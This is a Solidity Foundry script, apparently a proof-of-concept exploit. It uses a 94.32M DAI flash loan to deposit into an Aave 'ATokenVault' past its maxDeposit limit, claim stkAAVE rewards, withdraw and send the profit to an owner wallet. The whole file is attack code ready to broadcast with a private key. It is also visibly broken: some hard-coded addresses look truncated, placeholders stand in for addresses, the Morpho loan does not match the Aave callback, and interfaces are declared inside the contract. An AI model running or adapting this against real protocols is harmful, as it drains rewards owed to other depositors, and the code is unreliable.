// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@aave/core-v3/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol";
import "@aave/core-v3/contracts/interfaces/IPoolAddressesProvider.sol";
import "@aave/core-v3/contracts/interfaces/IPool.sol";
import "@morpho-org/morpho-core-v1/contracts/morpho/Morpho.sol"; // Placeholder for Morpho interface
import "./interfaces/IATokenVault.sol"; // Placeholder for ATokenVault interface
import "./interfaces/IStakedAave.sol"; // Placeholder for stkAAVE interface

contract DeployAndFlashLoanAave is Script, FlashLoanSimpleReceiverBase {
    using SafeERC20 for IERC20;

    // Mainnet Addresses (Replace with actual addresses for testing)
    IPoolAddressesProvider constant ADDRESSES_PROVIDER = IPoolAddressesProvider(0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9); // Aave V3 Ethereum
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F; // Dai
    address constant A_DAI = 0x028171bCA77440897B824Ca71D1c56caC55b68A3; // aDAI
    address constant MORPHO = 0x8888882f8f843896699869179fB6E4f7e3B58888; // Morpho (example, adjust)
    address constant ATOKEN_VAULT = 0xYourATokenVaultAddress; // Replace with actual ATokenVault address
    address constant STK_AAVE = 0x4da27a545c0c5B758a6BA100e3a049001de870f; // stkAAVE
    address constant OWNER = 0xYourWalletAddress; // Replace with your wallet address

    uint256 constant FLASH_LOAN_AMOUNT = 94_320_000 * 1e18; // 94.32M Dai (18 decimals)

    IERC20 dai = IERC20(DAI);
    IERC20 aDai = IERC20(A_DAI);
    IERC20 stkAave = IERC20(STK_AAVE);
    IATokenVault vault = IATokenVault(ATOKEN_VAULT);
    IStakedAave stkAaveContract = IStakedAave(STK_AAVE);
    Morpho morpho = Morpho(MORPHO);
    IPool pool = IPool(ADDRESSES_PROVIDER.getPool()); // Aave V3 Pool

    constructor() FlashLoanSimpleReceiverBase(ADDRESSES_PROVIDER) {}

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY")); // Use your private key for mainnet fork

        // Step 1: Borrow 94.32M Dai via Morpho flash loan
        bytes memory params = abi.encode(OWNER, FLASH_LOAN_AMOUNT);
        morpho.flashLoanSimple(address(this), DAI, FLASH_LOAN_AMOUNT, params);

        vm.stopBroadcast();
    }

    // Flash loan callback (execute operations)
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        require(asset == DAI, "Asset must be DAI");
        require(amount == FLASH_LOAN_AMOUNT, "Incorrect amount");
        require(initiator == address(this), "Initiator mismatch");

        (address receiver, uint256 loanAmount) = abi.decode(params, (address, uint256));

        // Step 2: Approve DAI for Aave pool
        dai.safeApprove(address(pool), loanAmount);

        // Step 3: Deposit Dai into Aave to mint aDAI
        pool.supply(DAI, loanAmount, address(this), 0); // Mint aDAI

        // Step 4: Approve aDAI for ATokenVault
        aDai.safeApprove(ATOKEN_VAULT, loanAmount);

        // Step 5: Deposit aDAI into ATokenVault
        vault.depositATokens(loanAmount, receiver); // Bypasses maxDeposit check

        // Step 6: Claim stkAAVE rewards (simplified, adjust for vault’s claim function)
        uint256 rewards = vault.claimRewards(receiver); // Assume 18.45 stkAAVE (4.65% APY, $1,845)
        require(rewards > 0, "No rewards claimed");

        // Step 7: Withdraw aDAI from vault
        uint256 aDaiBalance = aDai.balanceOf(address(this));
        vault.withdraw(aDaiBalance, receiver, address(this)); // Withdraw all aDAI

        // Step 8: Redeem aDAI for Dai in Aave
        aDai.safeApprove(address(pool), aDaiBalance);
        pool.withdraw(DAI, aDaiBalance, address(this)); // Get Dai back

        // Step 9: Repay flash loan (Dai + fee)
        uint256 totalRepay = loanAmount + fee;
        dai.safeTransfer(msg.sender, totalRepay); // Repay Morpho (adjust for Morpho’s API)

        // Step 10: Send profits (Dai + stkAAVE) to owner
        uint256 daiBalance = dai.balanceOf(address(this));
        dai.safeTransfer(receiver, daiBalance); // Net ~$1,426.55 Dai after fees
        stkAave.safeTransfer(receiver, rewards); // Send unsold stkAAVE (~$1,845 gross)

        return true;
    }

    // Interfaces (placeholders, replace with actual ABIs)
    interface IATokenVault {
        function depositATokens(uint256 assets, address receiver) external;
        function withdraw(uint256 assets, address receiver, address owner) external;
        function claimRewards(address receiver) external returns (uint256);
    }

    interface IStakedAave {
        // Define stkAAVE-specific functions if needed (e.g., staking, rewards)
    }
}